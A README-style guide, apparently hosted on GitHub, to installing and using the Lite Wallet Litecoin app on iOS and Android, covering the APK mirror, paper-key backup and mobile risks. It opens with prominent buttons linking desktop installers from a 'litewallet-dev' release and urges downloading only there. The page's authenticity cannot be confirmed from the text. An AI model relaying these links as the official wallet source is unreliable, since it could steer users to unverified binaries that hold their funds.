![Lite Wallet](assets/banner-article.png)

# Mobile: iOS, Android and the APK mirror

Phones, stores and the APK mirror, with the same twelve words as desktop.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet ships native apps for iOS and Android with the same features as the desktop builds, including MWEB private transactions and hardware-wallet pairing. iOS installs from the App Store only; Android installs from Google Play, with a signed APK on the GitHub releases page for devices without Play services. The 12-word paper key is created on the phone and never leaves it.

## How to install on iPhone and iPad

iOS has one route: the App Store. There is no side-loading, no test build to install and no download link that produces a working app, which is a useful fact when a message offers you one.

Open the store, search for the app, check the developer name before installing, then open it and complete first-run setup: write the 12 words on paper, confirm them, and let the wallet sync. The App Store's own listing is the authority on the current version; if the installed app is older, update it there rather than looking for an installer elsewhere.

Because iOS forbids side-loading, an "iOS build" offered by a website, a message or a profile download is not this wallet. That single rule prevents most iPhone impersonation attempts, and it is worth repeating to anyone who asks how to install an app that the store does not carry.

## How to install on Android

Android has two routes, and both deliver the same application. Google Play is the default: search, check the developer name, install, open. The APK mirror on the GitHub releases page exists for devices without Play services, for regions where Play is unavailable, and for users who prefer to install a signed file directly.

| Route | Where it comes from | Who it suits |
|---|---|---|
| Google Play | the store listing | most users; automatic updates |
| APK mirror | the GitHub releases page | devices without Play services |

Installing an APK requires allowing installs from that source on the device, which is a setting Android makes deliberately awkward. Allow it for the file manager or browser you are using, install the file, then turn the permission back off. If the APK is not signed by the Lite Wallet organisation, do not install it - that check is the only thing separating the mirror from a lookalike.

## What the mobile app does

The mobile build is not a companion to the desktop app; it is the same wallet with the same capabilities, which is why the paper key works on both and why a phone can restore a desktop wallet and vice versa.

| Capability | On mobile |
|---|---|
| Standard LTC send and receive | yes |
| MWEB private transactions | yes, including peg-in and peg-out |
| Hardware wallet pairing | yes, over USB-C or Bluetooth |
| Tor routing | yes, in Settings |
| CSV export | yes |
| LitVM and LTC-20 balances | yes |
| Biometric unlock | not a wallet feature; use the device lock |

Pairing a device from a phone is covered in [the hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md). That last row is honest rather than evasive. Phones have face and fingerprint unlock, and a wallet can lean on the operating system's lock; Lite Wallet does not add a separate biometric gate of its own. If a guide tells you to enable fingerprint unlock inside the app, it is describing a different app.

## The paper key on a phone

Mobile changes the backup problem, not the backup rule. A phone is lost, stolen, dropped in water and replaced far more often than a laptop, so the paper copy matters more, not less.

Write the 12 words on paper during setup, keep them away from the phone, and never photograph them. A photo of a paper key in a synced photo library is a copy of the key on someone else's server, which defeats the point of self-custody. If the phone is lost and the paper exists, the wallet is recoverable in minutes; if the paper is lost, the phone is the only copy, and phones break. How that backup is written and checked is the subject of [the paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md).

## What mobile changes about risk

A phone is a different threat surface from a laptop. It is carried, unlocked dozens of times a day, backed up to a cloud account by default, and replaced every few years. Each of those is convenient and each one touches wallet security in a specific way.

Cloud backups are the subtle one. A phone backup can capture application data; a wallet that stores keys locally still benefits from a written backup, because the paper key is the only copy that survives a lost device without depending on a vendor's cloud. Screen locks and biometrics protect a locked phone, not a wallet whose paper key was photographed. And resale is a real risk: a phone sold or repaired with the app still installed is a phone that may still hold a spendable wallet, which is why moving funds before a handover is the habit that matters.

## Moving between phone and desktop

The same 12 words restore the same wallet on any platform, so moving is a restore rather than a transfer. Install the app on the new device, choose restore, enter the words, and let the scan finish. Both devices then hold the same keys - which is convenient and worth understanding: two copies of the same wallet can both spend, so a device you no longer use should be wiped.

There is no pairing, no QR handoff and no cloud sync between devices, because there is no account to sync through. The paper key is the synchronisation mechanism, and it works offline.

## FAQ

### Is there an APK for Android outside the Play Store?

Yes. A signed APK is published on the GitHub releases page for devices without Play services. Install it only after confirming the signature names the Lite Wallet organisation.

### Can I side-load the iOS app?

No. iOS installs come from the App Store only, and an "iOS build" offered anywhere else is not this wallet. That is a platform rule, not a product choice.

### Does the app support fingerprint or face unlock?

The wallet does not add its own biometric gate; it relies on the device lock you already use. Keep the phone's passcode and biometrics enabled, and treat the paper key as the real protection.

### Does mobile support MWEB?

Yes, including peg-in and peg-out and private sends to `ltcmweb1` addresses. The behaviour matches the desktop build because both ship the same version.

### Can I pair a hardware wallet with my phone?

Yes, over USB-C or Bluetooth depending on the model, with signing confirmed on the device screen. The phone never sees the device's keys.

The current release is on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2) for Android's mirror and for every other platform.
